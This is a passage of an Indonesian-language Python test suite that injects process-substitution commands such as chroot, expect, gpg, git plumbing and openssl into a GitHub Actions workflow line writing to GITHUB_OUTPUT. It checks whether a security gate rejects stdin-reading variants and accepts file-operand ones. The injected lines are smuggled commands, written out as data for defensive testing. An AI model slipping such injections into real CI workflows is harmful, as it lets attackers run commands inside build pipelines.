                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru248 = isi_aksi248.replace(
                baris_aksi248,
                baris_aksi248.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(chroot /baru; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru248 != isi_aksi248, \
            "suntikan aksi248 tidak menembak"
        with open(berkas_aksi248, "w", encoding="utf-8") as f:
            f.write(isi_baru248)
        rc, out = jalan(sub248,
                        [sys.executable, GERBANG, "--semua"])
        periksa("chroot tanpa perintah: gerbang gagal (Audit 1121)", rc != 0)
        shutil.rmtree(sub248, ignore_errors=True)
        sub249 = klon(tmp, "sub249")
        berkas_aksi249 = os.path.join(
            sub249, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi249, encoding="utf-8") as f:
            isi_aksi249 = f.read()
        baris_aksi249 = [b for b in isi_aksi249.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru249 = isi_aksi249.replace(
                baris_aksi249,
                baris_aksi249.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(unshare -r cat berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru249 != isi_aksi249, \
            "suntikan aksi249 tidak menembak"
        with open(berkas_aksi249, "w", encoding="utf-8") as f:
            f.write(isi_baru249)
        rc, out = jalan(sub249,
                        [sys.executable, GERBANG, "--semua"])
        periksa("unshare berperintah: gerbang lolos (Audit 1121)", rc == 0)
        shutil.rmtree(sub249, ignore_errors=True)
        sub250 = klon(tmp, "sub250")
        berkas_aksi250 = os.path.join(
            sub250, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi250, encoding="utf-8") as f:
            isi_aksi250 = f.read()
        baris_aksi250 = [b for b in isi_aksi250.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru250 = isi_aksi250.replace(
                baris_aksi250,
                baris_aksi250.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(expect; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru250 != isi_aksi250, \
            "suntikan aksi250 tidak menembak"
        with open(berkas_aksi250, "w", encoding="utf-8") as f:
            f.write(isi_baru250)
        rc, out = jalan(sub250,
                        [sys.executable, GERBANG, "--semua"])
        periksa("expect telanjang: gerbang gagal (Audit 1122)", rc != 0)
        shutil.rmtree(sub250, ignore_errors=True)
        sub251 = klon(tmp, "sub251")
        berkas_aksi251 = os.path.join(
            sub251, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi251, encoding="utf-8") as f:
            isi_aksi251 = f.read()
        baris_aksi251 = [b for b in isi_aksi251.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru251 = isi_aksi251.replace(
                baris_aksi251,
                baris_aksi251.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(expect -f -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru251 != isi_aksi251, \
            "suntikan aksi251 tidak menembak"
        with open(berkas_aksi251, "w", encoding="utf-8") as f:
            f.write(isi_baru251)
        rc, out = jalan(sub251,
                        [sys.executable, GERBANG, "--semua"])
        periksa("expect -f -: gerbang gagal (Audit 1122)", rc != 0)
        shutil.rmtree(sub251, ignore_errors=True)
        sub252 = klon(tmp, "sub252")
        berkas_aksi252 = os.path.join(
            sub252, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi252, encoding="utf-8") as f:
            isi_aksi252 = f.read()
        baris_aksi252 = [b for b in isi_aksi252.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru252 = isi_aksi252.replace(
                baris_aksi252,
                baris_aksi252.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(expect -f skrip.exp; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru252 != isi_aksi252, \
            "suntikan aksi252 tidak menembak"
        with open(berkas_aksi252, "w", encoding="utf-8") as f:
            f.write(isi_baru252)
        rc, out = jalan(sub252,
                        [sys.executable, GERBANG, "--semua"])
        periksa("expect -f berkas: gerbang lolos (Audit 1122)", rc == 0)
        shutil.rmtree(sub252, ignore_errors=True)
        sub253 = klon(tmp, "sub253")
        berkas_aksi253 = os.path.join(
            sub253, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi253, encoding="utf-8") as f:
            isi_aksi253 = f.read()
        baris_aksi253 = [b for b in isi_aksi253.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru253 = isi_aksi253.replace(
                baris_aksi253,
                baris_aksi253.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(gpg --verify; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru253 != isi_aksi253, \
            "suntikan aksi253 tidak menembak"
        with open(berkas_aksi253, "w", encoding="utf-8") as f:
            f.write(isi_baru253)
        rc, out = jalan(sub253,
                        [sys.executable, GERBANG, "--semua"])
        periksa("gpg --verify: gerbang gagal (Audit 1123)", rc != 0)
        shutil.rmtree(sub253, ignore_errors=True)
        sub254 = klon(tmp, "sub254")
        berkas_aksi254 = os.path.join(
            sub254, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi254, encoding="utf-8") as f:
            isi_aksi254 = f.read()
        baris_aksi254 = [b for b in isi_aksi254.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru254 = isi_aksi254.replace(
                baris_aksi254,
                baris_aksi254.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(gpg --verify berkas.sig; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru254 != isi_aksi254, \
            "suntikan aksi254 tidak menembak"
        with open(berkas_aksi254, "w", encoding="utf-8") as f:
            f.write(isi_baru254)
        rc, out = jalan(sub254,
                        [sys.executable, GERBANG, "--semua"])
        periksa("gpg --verify beroperand: gerbang lolos (Audit 1123)", rc == 0)
        shutil.rmtree(sub254, ignore_errors=True)
        sub255 = klon(tmp, "sub255")
        berkas_aksi255 = os.path.join(
            sub255, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi255, encoding="utf-8") as f:
            isi_aksi255 = f.read()
        baris_aksi255 = [b for b in isi_aksi255.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru255 = isi_aksi255.replace(
                baris_aksi255,
                baris_aksi255.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git stripspace; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru255 != isi_aksi255, \
            "suntikan aksi255 tidak menembak"
        with open(berkas_aksi255, "w", encoding="utf-8") as f:
            f.write(isi_baru255)
        rc, out = jalan(sub255,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git stripspace: gerbang gagal (Audit 1124)", rc != 0)
        shutil.rmtree(sub255, ignore_errors=True)
        sub256 = klon(tmp, "sub256")
        berkas_aksi256 = os.path.join(
            sub256, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi256, encoding="utf-8") as f:
            isi_aksi256 = f.read()
        baris_aksi256 = [b for b in isi_aksi256.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru256 = isi_aksi256.replace(
                baris_aksi256,
                baris_aksi256.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git patch-id; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru256 != isi_aksi256, \
            "suntikan aksi256 tidak menembak"
        with open(berkas_aksi256, "w", encoding="utf-8") as f:
            f.write(isi_baru256)
        rc, out = jalan(sub256,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git patch-id: gerbang gagal (Audit 1124)", rc != 0)
        shutil.rmtree(sub256, ignore_errors=True)
        sub257 = klon(tmp, "sub257")
        berkas_aksi257 = os.path.join(
            sub257, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi257, encoding="utf-8") as f:
            isi_aksi257 = f.read()
        baris_aksi257 = [b for b in isi_aksi257.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru257 = isi_aksi257.replace(
                baris_aksi257,
                baris_aksi257.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git mktag; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru257 != isi_aksi257, \
            "suntikan aksi257 tidak menembak"
        with open(berkas_aksi257, "w", encoding="utf-8") as f:
            f.write(isi_baru257)
        rc, out = jalan(sub257,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git mktag: gerbang gagal (Audit 1124)", rc != 0)
        shutil.rmtree(sub257, ignore_errors=True)
        sub258 = klon(tmp, "sub258")
        berkas_aksi258 = os.path.join(
            sub258, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi258, encoding="utf-8") as f:
            isi_aksi258 = f.read()
        baris_aksi258 = [b for b in isi_aksi258.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru258 = isi_aksi258.replace(
                baris_aksi258,
                baris_aksi258.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git update-index --index-info; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru258 != isi_aksi258, \
            "suntikan aksi258 tidak menembak"
        with open(berkas_aksi258, "w", encoding="utf-8") as f:
            f.write(isi_baru258)
        rc, out = jalan(sub258,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git update-index --index-info: gerbang gagal (Audit 1124)", rc != 0)
        shutil.rmtree(sub258, ignore_errors=True)
        sub259 = klon(tmp, "sub259")
        berkas_aksi259 = os.path.join(
            sub259, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi259, encoding="utf-8") as f:
            isi_aksi259 = f.read()
        baris_aksi259 = [b for b in isi_aksi259.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru259 = isi_aksi259.replace(
                baris_aksi259,
                baris_aksi259.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git index-pack --stdin; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru259 != isi_aksi259, \
            "suntikan aksi259 tidak menembak"
        with open(berkas_aksi259, "w", encoding="utf-8") as f:
            f.write(isi_baru259)
        rc, out = jalan(sub259,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git index-pack --stdin: gerbang gagal (Audit 1124)", rc != 0)
        shutil.rmtree(sub259, ignore_errors=True)
        sub260 = klon(tmp, "sub260")
        berkas_aksi260 = os.path.join(
            sub260, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi260, encoding="utf-8") as f:
            isi_aksi260 = f.read()
        baris_aksi260 = [b for b in isi_aksi260.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru260 = isi_aksi260.replace(
                baris_aksi260,
                baris_aksi260.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git index-pack berkas.pack; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru260 != isi_aksi260, \
            "suntikan aksi260 tidak menembak"
        with open(berkas_aksi260, "w", encoding="utf-8") as f:
            f.write(isi_baru260)
        rc, out = jalan(sub260,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git index-pack beroperand: gerbang lolos (Audit 1124)", rc == 0)
        shutil.rmtree(sub260, ignore_errors=True)
        sub261 = klon(tmp, "sub261")
        berkas_aksi261 = os.path.join(
            sub261, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi261, encoding="utf-8") as f:
            isi_aksi261 = f.read()
        baris_aksi261 = [b for b in isi_aksi261.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru261 = isi_aksi261.replace(
                baris_aksi261,
                baris_aksi261.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(numfmt --from auto; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru261 != isi_aksi261, \
            "suntikan aksi261 tidak menembak"
        with open(berkas_aksi261, "w", encoding="utf-8") as f:
            f.write(isi_baru261)
        rc, out = jalan(sub261,
                        [sys.executable, GERBANG, "--semua"])
        periksa("numfmt --from: gerbang gagal (Audit 1125)", rc != 0)
        shutil.rmtree(sub261, ignore_errors=True)
        sub262 = klon(tmp, "sub262")
        berkas_aksi262 = os.path.join(
            sub262, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi262, encoding="utf-8") as f:
            isi_aksi262 = f.read()
        baris_aksi262 = [b for b in isi_aksi262.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru262 = isi_aksi262.replace(
                baris_aksi262,
                baris_aksi262.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(numfmt --to si; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru262 != isi_aksi262, \
            "suntikan aksi262 tidak menembak"
        with open(berkas_aksi262, "w", encoding="utf-8") as f:
            f.write(isi_baru262)
        rc, out = jalan(sub262,
                        [sys.executable, GERBANG, "--semua"])
        periksa("numfmt --to: gerbang gagal (Audit 1125)", rc != 0)
        shutil.rmtree(sub262, ignore_errors=True)
        sub263 = klon(tmp, "sub263")
        berkas_aksi263 = os.path.join(
            sub263, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi263, encoding="utf-8") as f:
            isi_aksi263 = f.read()
        baris_aksi263 = [b for b in isi_aksi263.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru263 = isi_aksi263.replace(
                baris_aksi263,
                baris_aksi263.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(numfmt --from-unit 1000; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru263 != isi_aksi263, \
            "suntikan aksi263 tidak menembak"
        with open(berkas_aksi263, "w", encoding="utf-8") as f:
            f.write(isi_baru263)
        rc, out = jalan(sub263,
                        [sys.executable, GERBANG, "--semua"])
        periksa("numfmt --from-unit: gerbang gagal (Audit 1125)", rc != 0)
        shutil.rmtree(sub263, ignore_errors=True)
        sub264 = klon(tmp, "sub264")
        berkas_aksi264 = os.path.join(
            sub264, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi264, encoding="utf-8") as f:
            isi_aksi264 = f.read()
        baris_aksi264 = [b for b in isi_aksi264.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru264 = isi_aksi264.replace(
                baris_aksi264,
                baris_aksi264.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(numfmt berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru264 != isi_aksi264, \
            "suntikan aksi264 tidak menembak"
        with open(berkas_aksi264, "w", encoding="utf-8") as f:
            f.write(isi_baru264)
        rc, out = jalan(sub264,
                        [sys.executable, GERBANG, "--semua"])
        periksa("numfmt beroperand: gerbang lolos (Audit 1125)", rc == 0)
        shutil.rmtree(sub264, ignore_errors=True)
        sub265 = klon(tmp, "sub265")
        berkas_aksi265 = os.path.join(
            sub265, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi265, encoding="utf-8") as f:
            isi_aksi265 = f.read()
        baris_aksi265 = [b for b in isi_aksi265.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru265 = isi_aksi265.replace(
                baris_aksi265,
                baris_aksi265.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(jq --indent 2 .; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru265 != isi_aksi265, \
            "suntikan aksi265 tidak menembak"
        with open(berkas_aksi265, "w", encoding="utf-8") as f:
            f.write(isi_baru265)
        rc, out = jalan(sub265,
                        [sys.executable, GERBANG, "--semua"])
        periksa("jq --indent: gerbang gagal (Audit 1126)", rc != 0)
        shutil.rmtree(sub265, ignore_errors=True)
        sub266 = klon(tmp, "sub266")
        berkas_aksi266 = os.path.join(
            sub266, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi266, encoding="utf-8") as f:
            isi_aksi266 = f.read()
        baris_aksi266 = [b for b in isi_aksi266.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru266 = isi_aksi266.replace(
                baris_aksi266,
                baris_aksi266.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(jq . berkas.json; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru266 != isi_aksi266, \
            "suntikan aksi266 tidak menembak"
        with open(berkas_aksi266, "w", encoding="utf-8") as f:
            f.write(isi_baru266)
        rc, out = jalan(sub266,
                        [sys.executable, GERBANG, "--semua"])
        periksa("jq beroperand: gerbang lolos (Audit 1126)", rc == 0)
        shutil.rmtree(sub266, ignore_errors=True)
        sub267 = klon(tmp, "sub267")
        berkas_aksi267 = os.path.join(
            sub267, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi267, encoding="utf-8") as f:
            isi_aksi267 = f.read()
        baris_aksi267 = [b for b in isi_aksi267.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru267 = isi_aksi267.replace(
                baris_aksi267,
                baris_aksi267.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(grep --exclude-from daftar pola; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru267 != isi_aksi267, \
            "suntikan aksi267 tidak menembak"
        with open(berkas_aksi267, "w", encoding="utf-8") as f:
            f.write(isi_baru267)
        rc, out = jalan(sub267,
                        [sys.executable, GERBANG, "--semua"])
        periksa("grep --exclude-from: gerbang gagal (Audit 1127)", rc != 0)
        shutil.rmtree(sub267, ignore_errors=True)
        sub268 = klon(tmp, "sub268")
        berkas_aksi268 = os.path.join(
            sub268, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi268, encoding="utf-8") as f:
            isi_aksi268 = f.read()
        baris_aksi268 = [b for b in isi_aksi268.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru268 = isi_aksi268.replace(
                baris_aksi268,
                baris_aksi268.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(grep --label nama pola; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru268 != isi_aksi268, \
            "suntikan aksi268 tidak menembak"
        with open(berkas_aksi268, "w", encoding="utf-8") as f:
            f.write(isi_baru268)
        rc, out = jalan(sub268,
                        [sys.executable, GERBANG, "--semua"])
        periksa("grep --label: gerbang gagal (Audit 1127)", rc != 0)
        shutil.rmtree(sub268, ignore_errors=True)
        sub269 = klon(tmp, "sub269")
        berkas_aksi269 = os.path.join(
            sub269, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi269, encoding="utf-8") as f:
            isi_aksi269 = f.read()
        baris_aksi269 = [b for b in isi_aksi269.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru269 = isi_aksi269.replace(
                baris_aksi269,
                baris_aksi269.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(grep --exclude x pola berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru269 != isi_aksi269, \
            "suntikan aksi269 tidak menembak"
        with open(berkas_aksi269, "w", encoding="utf-8") as f:
            f.write(isi_baru269)
        rc, out = jalan(sub269,
                        [sys.executable, GERBANG, "--semua"])
        periksa("grep beroperand berkas: gerbang lolos (Audit 1127)", rc == 0)
        shutil.rmtree(sub269, ignore_errors=True)
        sub270 = klon(tmp, "sub270")
        berkas_aksi270 = os.path.join(
            sub270, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi270, encoding="utf-8") as f:
            isi_aksi270 = f.read()
        baris_aksi270 = [b for b in isi_aksi270.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru270 = isi_aksi270.replace(
                baris_aksi270,
                baris_aksi270.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl crl; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru270 != isi_aksi270, \
            "suntikan aksi270 tidak menembak"
        with open(berkas_aksi270, "w", encoding="utf-8") as f:
            f.write(isi_baru270)
        rc, out = jalan(sub270,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl crl: gerbang gagal (Audit 1128)", rc != 0)
        shutil.rmtree(sub270, ignore_errors=True)
        sub271 = klon(tmp, "sub271")
        berkas_aksi271 = os.path.join(
            sub271, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi271, encoding="utf-8") as f:
            isi_aksi271 = f.read()
        baris_aksi271 = [b for b in isi_aksi271.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru271 = isi_aksi271.replace(
                baris_aksi271,
                baris_aksi271.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl pkcs7; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru271 != isi_aksi271, \
            "suntikan aksi271 tidak menembak"
        with open(berkas_aksi271, "w", encoding="utf-8") as f:
            f.write(isi_baru271)
        rc, out = jalan(sub271,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl pkcs7: gerbang gagal (Audit 1128)", rc != 0)
        shutil.rmtree(sub271, ignore_errors=True)
        sub272 = klon(tmp, "sub272")
        berkas_aksi272 = os.path.join(
            sub272, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi272, encoding="utf-8") as f:
            isi_aksi272 = f.read()
        baris_aksi272 = [b for b in isi_aksi272.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru272 = isi_aksi272.replace(
                baris_aksi272,
                baris_aksi272.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl verify; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru272 != isi_aksi272, \
            "suntikan aksi272 tidak menembak"
        with open(berkas_aksi272, "w", encoding="utf-8") as f:
            f.write(isi_baru272)
        rc, out = jalan(sub272,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl verify: gerbang gagal (Audit 1128)", rc != 0)
        shutil.rmtree(sub272, ignore_errors=True)
        sub273 = klon(tmp, "sub273")
        berkas_aksi273 = os.path.join(
            sub273, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi273, encoding="utf-8") as f:
            isi_aksi273 = f.read()
        baris_aksi273 = [b for b in isi_aksi273.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru273 = isi_aksi273.replace(
                baris_aksi273,
                baris_aksi273.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl verify sert.pem; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru273 != isi_aksi273, \
            "suntikan aksi273 tidak menembak"
        with open(berkas_aksi273, "w", encoding="utf-8") as f:
            f.write(isi_baru273)
        rc, out = jalan(sub273,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl verify beroperand: gerbang lolos (Audit 1128)", rc == 0)
        shutil.rmtree(sub273, ignore_errors=True)
        sub274 = klon(tmp, "sub274")
        berkas_aksi274 = os.path.join(
            sub274, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi274, encoding="utf-8") as f:
            isi_aksi274 = f.read()
        baris_aksi274 = [b for b in isi_aksi274.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru274 = isi_aksi274.replace(
                baris_aksi274,
                baris_aksi274.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl crl -in berkas.pem; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru274 != isi_aksi274, \
            "suntikan aksi274 tidak menembak"
        with open(berkas_aksi274, "w", encoding="utf-8") as f:
            f.write(isi_baru274)
        rc, out = jalan(sub274,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl crl -in: gerbang lolos (Audit 1128)", rc == 0)
        shutil.rmtree(sub274, ignore_errors=True)
        sub275 = klon(tmp, "sub275")
        berkas_aksi275 = os.path.join(
            sub275, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi275, encoding="utf-8") as f:
            isi_aksi275 = f.read()
        baris_aksi275 = [b for b in isi_aksi275.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru275 = isi_aksi275.replace(
                baris_aksi275,
                baris_aksi275.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst -sha256 -mac hmac -macopt key:abc; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru275 != isi_aksi275, \
            "suntikan aksi275 tidak menembak"
        with open(berkas_aksi275, "w", encoding="utf-8") as f:
            f.write(isi_baru275)
        rc, out = jalan(sub275,
                        [sys.executable, GERBANG, "--semua"])
        periksa("dgst -mac: gerbang gagal (Audit 1129)", rc != 0)
        shutil.rmtree(sub275, ignore_errors=True)
        sub276 = klon(tmp, "sub276")
        berkas_aksi276 = os.path.join(
            sub276, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi276, encoding="utf-8") as f:
            isi_aksi276 = f.read()
        baris_aksi276 = [b for b in isi_aksi276.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru276 = isi_aksi276.replace(
                baris_aksi276,
                baris_aksi276.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst -sha256 berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru276 != isi_aksi276, \
            "suntikan aksi276 tidak menembak"
        with open(berkas_aksi276, "w", encoding="utf-8") as f:
            f.write(isi_baru276)
        rc, out = jalan(sub276,
                        [sys.executable, GERBANG, "--semua"])
        periksa("dgst beroperand: gerbang lolos (Audit 1129)", rc == 0)
        shutil.rmtree(sub276, ignore_errors=True)
        sub277 = klon(tmp, "sub277")
        berkas_aksi277 = os.path.join(
            sub277, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi277, encoding="utf-8") as f:
            isi_aksi277 = f.read()
        baris_aksi277 = [b for b in isi_aksi277.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru277 = isi_aksi277.replace(
                baris_aksi277,
                baris_aksi277.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(zip -@ -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru277 != isi_aksi277, \
            "suntikan aksi277 tidak menembak"
        with open(berkas_aksi277, "w", encoding="utf-8") as f:
            f.write(isi_baru277)
        rc, out = jalan(sub277,
                        [sys.executable, GERBANG, "--semua"])
        periksa("zip -@ -: gerbang gagal (Audit 1130)", rc != 0)
        shutil.rmtree(sub277, ignore_errors=True)
        sub278 = klon(tmp, "sub278")
        berkas_aksi278 = os.path.join(
            sub278, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi278, encoding="utf-8") as f:
            isi_aksi278 = f.read()
        baris_aksi278 = [b for b in isi_aksi278.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru278 = isi_aksi278.replace(
                baris_aksi278,
                baris_aksi278.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(zip - -@; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru278 != isi_aksi278, \
            "suntikan aksi278 tidak menembak"
        with open(berkas_aksi278, "w", encoding="utf-8") as f:
            f.write(isi_baru278)
        rc, out = jalan(sub278,
                        [sys.executable, GERBANG, "--semua"])
        periksa("zip - -@: gerbang gagal (Audit 1130)", rc != 0)
        shutil.rmtree(sub278, ignore_errors=True)
        sub279 = klon(tmp, "sub279")
        berkas_aksi279 = os.path.join(
            sub279, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi279, encoding="utf-8") as f:
            isi_aksi279 = f.read()
        baris_aksi279 = [b for b in isi_aksi279.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru279 = isi_aksi279.replace(
                baris_aksi279,
                baris_aksi279.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(zip -@; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru279 != isi_aksi279, \
            "suntikan aksi279 tidak menembak"
        with open(berkas_aksi279, "w", encoding="utf-8") as f:
            f.write(isi_baru279)
        rc, out = jalan(sub279,
                        [sys.executable, GERBANG, "--semua"])
        periksa("zip -@ tanpa arsip: gerbang lolos (Audit 1130)", rc == 0)
        shutil.rmtree(sub279, ignore_errors=True)
        sub280 = klon(tmp, "sub280")
        berkas_aksi280 = os.path.join(
            sub280, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi280, encoding="utf-8") as f:
            isi_aksi280 = f.read()
        baris_aksi280 = [b for b in isi_aksi280.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru280 = isi_aksi280.replace(
                baris_aksi280,
                baris_aksi280.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(patch -i-; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru280 != isi_aksi280, \
            "suntikan aksi280 tidak menembak"
        with open(berkas_aksi280, "w", encoding="utf-8") as f:
            f.write(isi_baru280)
        rc, out = jalan(sub280,
                        [sys.executable, GERBANG, "--semua"])
        periksa("patch -i-: gerbang gagal (Audit 1131)", rc != 0)
        shutil.rmtree(sub280, ignore_errors=True)
